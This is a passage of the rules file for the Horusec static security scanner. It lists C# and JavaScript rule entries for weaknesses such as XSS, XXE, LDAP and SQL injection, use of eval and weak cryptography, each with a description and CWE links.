      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#missing-anti-forgery-token-attribute' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/352.html' target='_blank'>https://cwe.mitre.org/data/definitions/352.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-64</key>
    <name>Unvalidated Web Forms Redirect</name>
    <description>
      <![CDATA[Passing unvalidated redirect locations to the Response.Redirect method can allow attackers to send users to malicious web sites. This can allow attackers to perform phishing attacks and distribute malware to victims. For more information checkout the CWE-601 (https://cwe.mitre.org/data/definitions/601.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#unvalidated-web-forms-redirect' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#unvalidated-web-forms-redirect</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#unvalidated-web-forms-redirect' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/601.html' target='_blank'>https://cwe.mitre.org/data/definitions/601.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-65</key>
    <name>Identity Password Lockout Disabled</name>
    <description>
      <![CDATA[Password lockout mechanisms help prevent continuous brute force attacks again user accounts by disabling an account for a period of time after a number of invalid attempts. The ASP.NET Identity SignInManager protects against brute force attacks if the lockout parameter is set to true. For more information checkout the CWE-307 (https://cwe.mitre.org/data/definitions/307.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#identity-password-lockout-disabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#identity-password-lockout-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#identity-password-lockout-disabled' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/307.html' target='_blank'>https://cwe.mitre.org/data/definitions/307.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-66</key>
    <name>Raw Inline Expression</name>
    <description>
      <![CDATA[Data is written to the browser using a raw write: <%= var %>. This can result in Cross-Site Scripting (XSS) vulnerabilities if the data source is considered untrusted or dynamic (request parameters, database, web service, etc.). Instead of using a raw write, use the inline HTML encoded shortcut (<%: var %>) to automatically HTML encode data before writing it to the browser. For more information checkout the CWE-79 (https://cwe.mitre.org/data/definitions/79.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#raw-inline-expression' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#raw-inline-expression</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#raw-inline-expression' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/79.html' target='_blank'>https://cwe.mitre.org/data/definitions/79.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-67</key>
    <name>Raw Binding Expression</name>
    <description>
      <![CDATA[Data is written to the browser using a raw binding expression: <%# Item.Variable %>. This can result in Cross-Site Scripting (XSS) vulnerabilities if the data source is considered untrusted or dynamic (request parameters, database, web service, etc.). Instead of using a raw binding expression, use the HTML encoded binding shortcut (<%#: Item.Variable %>) to automatically HTML encode data before writing it to the browser. For more information checkout the CWE-79 (https://cwe.mitre.org/data/definitions/79.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#raw-binding-expression' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#raw-binding-expression</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#raw-binding-expression' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/79.html' target='_blank'>https://cwe.mitre.org/data/definitions/79.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-68</key>
    <name>Raw Write Literal Method</name>
    <description>
      <![CDATA[Data is written to the browser using the raw WriteLiteral method. This can result in Cross-Site Scripting (XSS) vulnerabilities if the data source is considered untrusted or dynamic (request parameters, database, web service, etc.). Instead of using the raw WriteLiteral method, use a Razor helper that performs automatic HTML encoding before writing it to the browser. For more information checkout the CWE-79 (https://cwe.mitre.org/data/definitions/79.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#raw-write-literal-method' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#raw-write-literal-method</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#raw-write-literal-method' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/79.html' target='_blank'>https://cwe.mitre.org/data/definitions/79.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-69</key>
    <name>Unencoded Web Forms Property</name>
    <description>
      <![CDATA[Data is written to the browser using a WebForms property that does not perform output encoding. This can result in Cross-Site Scripting (XSS) vulnerabilities if the data source is considered untrusted or dynamic (request parameters, database, web service, etc.). WebForms controls are often found in HTML contexts, but can also appear in other contexts such as JavaScript, HTML Attribute, or URL. Fixing the vulnerability requires the appropriate Web Protection Library (aka AntiXSS) context-specific method to encode the data before setting the WebForms property. For more information checkout the CWE-79 (https://cwe.mitre.org/data/definitions/79.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#unencoded-web-forms-property' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#unencoded-web-forms-property</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#unencoded-web-forms-property' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/79.html' target='_blank'>https://cwe.mitre.org/data/definitions/79.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-70</key>
    <name>Unencoded Label Text</name>
    <description>
      <![CDATA[Data is written to the browser using the raw Label.Text method. This can result in Cross-Site Scripting (XSS) vulnerabilities if the data source is considered untrusted or dynamic (request parameters, database, web service, etc.). Label controls are often found in HTML contexts, but can also appear in other contexts such as JavaScript, HTML Attribute, or URL. Fixing the vulnerability requires the appropriate Web Protection Library (aka AntiXSS) context-specific method to encode the data before setting the Label.Text property. For more information checkout the CWE-79 (https://cwe.mitre.org/data/definitions/79.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#unencoded-label-text' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#unencoded-label-text</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#unencoded-label-text' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/79.html' target='_blank'>https://cwe.mitre.org/data/definitions/79.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-71</key>
    <name>Weak Random Number Generator</name>
    <description>
      <![CDATA[The use of a predictable random value can lead to vulnerabilities when used in certain security critical contexts. For more information access: (https://security-code-scan.github.io/#SCS0005) or (https://cwe.mitre.org/data/definitions/338.html). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-random-number-generator' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-random-number-generator</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-random-number-generator' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0005' target='_blank'>https://security-code-scan.github.io/#SCS0005</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-72</key>
    <name>Weak Rsa Key Length</name>
    <description>
      <![CDATA[Due to advances in cryptanalysis attacks and cloud computing capabilities, the National Institute of Standards and Technology (NIST) deprecated 1024-bit RSA keys on January 1, 2011. The Certificate Authority Browser Forum, along with the latest version of all browsers, currently mandates a minimum key size of 2048-bits for all RSA keys. For more information checkout the CWE-326 (https://cwe.mitre.org/data/definitions/326.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-rsa-key-length' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-rsa-key-length</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-rsa-key-length' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/326.html' target='_blank'>https://cwe.mitre.org/data/definitions/326.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-73</key>
    <name>Xml Reader External Entity Expansion</name>
    <description>
      <![CDATA[XML External Entity (XXE) vulnerabilities occur when applications process untrusted XML data without disabling external entities and DTD processing. Processing untrusted XML data with a vulnerable parser can allow attackers to extract data from the server, perform denial of service attacks, and in some cases gain remote code execution. The XmlReaderSettings and XmlTextReader classes are vulnerable to XXE attacks when setting the DtdProcessing property to DtdProcessing.Parse or the ProhibitDtd property to false.\n\n \n\nTo prevent XmlReader XXE attacks, avoid using the deprecated ProhibitDtd property. Set the DtdProcessing property to DtdProcessing.Prohibit. For more information checkout the CWE-611 (https://cwe.mitre.org/data/definitions/611.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xml-reader-external-entity-expansion' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xml-reader-external-entity-expansion</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xml-reader-external-entity-expansion' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/611.html' target='_blank'>https://cwe.mitre.org/data/definitions/611.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-74</key>
    <name>Ldap Injection Directory Entry</name>
    <description>
      <![CDATA[LDAP Injection vulnerabilities occur when untrusted data is concatenated into a LDAP Path or Filter expression without properly escaping control characters. This can allow attackers to change the meaning of an LDAP query and gain access to resources for which they are not authorized. Fixing the LDAP Injection Directory Entry vulnerability requires untrusted data to be encoded using the appropriate Web Protection Library (aka AntiXSS) LDAP encoding method: Encoder.LdapDistinguishedNameEncode(). For more information checkout the CWE-90 (https://cwe.mitre.org/data/definitions/90.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-directory-entry' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-directory-entry</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-directory-entry' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/90.html' target='_blank'>https://cwe.mitre.org/data/definitions/90.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-1</key>
    <name>No Log Sensitive Information in console</name>
    <description>
      <![CDATA[The App logs information. Sensitive information should never be logged. For more information check out the CWE-532 (https://cwe.mitre.org/data/definitions/532.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-log-sensitive-information-in-console' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-log-sensitive-information-in-console</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-log-sensitive-information-in-console' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/532.html' target='_blank'>https://cwe.mitre.org/data/definitions/532.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-2</key>
    <name>No use eval</name>
    <description>
      <![CDATA[The eval function is extremely dangerous. Because if any user input is not handled correctly and passed to it, it will be possible to execute code remotely in the context of your application (RCE - Remote Code Executuion). For more information check out the CWE-94 (https://cwe.mitre.org/data/definitions/94.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-eval' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-eval</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-eval' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/94.html' target='_blank'>https://cwe.mitre.org/data/definitions/94.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-3</key>
    <name>No disable tls reject unauthorized</name>
    <description>
      <![CDATA[If the NODE_TLS_REJECT_UNAUTHORIZED option is disabled, the Node.js server will accept certificates that are self-signed, allowing an attacker to bypass the TLS security layer. For more information check out the CWE-295 (https://cwe.mitre.org/data/definitions/295.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-disable-tls-reject-unauthorized' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-disable-tls-reject-unauthorized</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-disable-tls-reject-unauthorized' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/295.html' target='_blank'>https://cwe.mitre.org/data/definitions/295.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-4</key>
    <name>No use MD5 hashing</name>
    <description>
      <![CDATA[The MD5 hash algorithm that was used is considered weak. It can also cause hash collisions. It is always recommended to use some CHF (Cryptographic Hash Function), which is mathematically strong and not reversible. SHA512 would be the most recommended hash for storing the password and it is also important to adopt some type of Salt, so that the Hash is more secure. For more information check out the CWE-327 (https://cwe.mitre.org/data/definitions/327.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-md5-hashing' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-md5-hashing</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-md5-hashing' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/327.html' target='_blank'>https://cwe.mitre.org/data/definitions/327.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-5</key>
    <name>No use SAH1 hashing</name>
    <description>
      <![CDATA[The SHA1 hash algorithm that was used is considered weak. It can also cause hash collisions. It is always recommended to use some CHF (Cryptographic Hash Function), which is mathematically strong and not reversible. SHA512 would be the most recommended hash for storing the password and it is also important to adopt some type of Salt, so that the Hash is more secure. For more information check out the CWE-327 (https://cwe.mitre.org/data/definitions/327.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-sah1-hashing' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-sah1-hashing</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-sah1-hashing' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/327.html' target='_blank'>https://cwe.mitre.org/data/definitions/327.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-6</key>
    <name>No use weak random number generator</name>
    <description>
      <![CDATA[When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that will be generated, and use this guess to impersonate another user or access sensitive information. As the Math.random() function relies on a weak pseudorandom number generator, this function should not be used for security-critical applications or for protecting sensitive data. In such context, a cryptographically strong pseudorandom number generator (CSPRNG) should be used instead. For more information check out the CWE-338 (https://cwe.mitre.org/data/definitions/338.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-weak-random-number-generator' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-weak-random-number-generator</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-weak-random-number-generator' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/338.html' target='_blank'>https://cwe.mitre.org/data/definitions/338.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-7</key>
    <name>No read file using data from request</name>
    <description>
      <![CDATA[User data passed untreated to the &#8216;createReadStream&#8217; function can cause a Directory Traversal attack. This attack exploits the lack of security, with the attacker gaining unauthorized access to the file system. For more information check out the CWE-35 (https://cwe.mitre.org/data/definitions/35.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-read-file-using-data-from-request' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-read-file-using-data-from-request</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-read-file-using-data-from-request' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/35.html' target='_blank'>https://cwe.mitre.org/data/definitions/35.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-8</key>
    <name>No create read stream using data from request</name>
    <description>
      <![CDATA[User data passed untreated to the &#8216;createReadStream&#8217; function can cause a Directory Traversal attack. This attack exploits the lack of security, with the attacker gaining unauthorized access to the file system. For more information check  out the CWE-35 (https://cwe.mitre.org/data/definitions/35.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-create-read-stream-using-data-from-request' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-create-read-stream-using-data-from-request</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-create-read-stream-using-data-from-request' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/35.html' target='_blank'>https://cwe.mitre.org/data/definitions/35.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-9</key>
    <name>SQL Injection Using params</name>
    <description>
      <![CDATA[Passing untreated parameters to queries in the database can cause an injection of SQL / NoSQL. The attacker is able to insert a custom and improper SQL statement through the data entry of an application. For more information check out the CWE-89 (https://cwe.mitre.org/data/definitions/89.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#sql-injection-using-params' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#sql-injection-using-params</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#sql-injection-using-params' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/89.html' target='_blank'>https://cwe.mitre.org/data/definitions/89.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-10</key>
    <name>XML parsers should not be vulnerable to XXE attacks</name>
    <description>
      <![CDATA[XML specification allows the use of entities that can be internal or external (file system / network access &#8230;) which could lead to vulnerabilities such as confidential file disclosures or SSRFs. For more information check out the CWE-827 (https://cwe.mitre.org/data/definitions/827.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#xml-parsers-should-not-be-vulnerable-to-xxe-attacks' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#xml-parsers-should-not-be-vulnerable-to-xxe-attacks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#xml-parsers-should-not-be-vulnerable-to-xxe-attacks' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/827.html' target='_blank'>https://cwe.mitre.org/data/definitions/827.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-11</key>
    <name>Origins should be verified during cross-origin communications</name>
    <description>
      <![CDATA[Browsers allow message exchanges between Window objects of different origins. Because any window can send / receive messages from other window it is important to verify the sender&#8217;s / receiver&#8217;s identity: When sending message with postMessage method, the identity&#8217;s receiver should be defined (the wildcard keyword (*) should not be used).\nWhen receiving message with message event, the sender&#8217;s identity should be verified using the origin and possibly source properties. For more information check out the OWASP A2:2017 (https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication) and (https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#origins-should-be-verified-during-cross-origin-communications' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#origins-should-be-verified-during-cross-origin-communications</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#origins-should-be-verified-during-cross-origin-communications' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication' target='_blank'>https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-12</key>
    <name>Weak SSL/TLS protocols should not be used</name>
    <description>
      <![CDATA[Older versions of SSL/TLS protocol like "SSLv3" have been proven to be insecure. This rule raises an issue when an SSL/TLS context is created with an insecure protocol version (ie: a protocol different from "TLSv1.2", "TLSv1.3", "DTLSv1.2" or "DTLSv1.3"). For more information check out the CWE-326 (https://cwe.mitre.org/data/definitions/326.html) and CWE-327 (https://cwe.mitre.org/data/definitions/327.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#weak-ssltls-protocols-should-not-be-used' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#weak-ssltls-protocols-should-not-be-used</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#weak-ssltls-protocols-should-not-be-used' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/326.html' target='_blank'>https://cwe.mitre.org/data/definitions/326.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-13</key>
    <name>Web SQL databases should not be used</name>
    <description>
      <![CDATA[The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some browsers. (It is not supported in Firefox or IE.)\n\nFurther, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database. For more information check out the OWSAP A3:2017 (https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html) and A9:2017 (https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#web-sql-databases-should-not-be-used' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#web-sql-databases-should-not-be-used</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#web-sql-databases-should-not-be-used' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html' target='_blank'>https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-14</key>
    <name>Local storage should not be used</name>
    <description>
      <![CDATA[Session storage and local storage are HTML 5 features which allow developers to easily store megabytes of data client-side, as opposed to the 4Kb cookies can accommodate. While useful to speed applications up on the client side, it can be dangerous to store sensitive information this way because the data is not encrypted by default and any script on the page may access it. This rule raises an issue when the localStorage and sessionStorage API&#8217;s are used. For more information check out the OWSAP A3:2017 (https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#local-storage-should-not-be-used' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#local-storage-should-not-be-used</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#local-storage-should-not-be-used' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html' target='_blank'>https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-15</key>
    <name>Debugger statements should not be used</name>
    <description>
      <![CDATA[The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to attacks in production. For more information check out the CWE-489 (https://cwe.mitre.org/data/definitions/489.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#debugger-statements-should-not-be-used' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#debugger-statements-should-not-be-used</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#debugger-statements-should-not-be-used' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/489.html' target='_blank'>https://cwe.mitre.org/data/definitions/489.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-16</key>
    <name>Alert statements should not be used</name>
    <description>
      <![CDATA[alert(&#8230;) as well as confirm(&#8230;) and prompt(&#8230;) can be useful for debugging during development, but in production mode this kind of pop-up could expose sensitive information to attackers, and should never be displayed. For more information check out the CWE-489 (https://cwe.mitre.org/data/definitions/489.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#alert-statements-should-not-be-used' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#alert-statements-should-not-be-used</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#alert-statements-should-not-be-used' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/489.html' target='_blank'>https://cwe.mitre.org/data/definitions/489.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-17</key>
    <name>Statically serving hidden files is security-sensitive</name>
    <description>
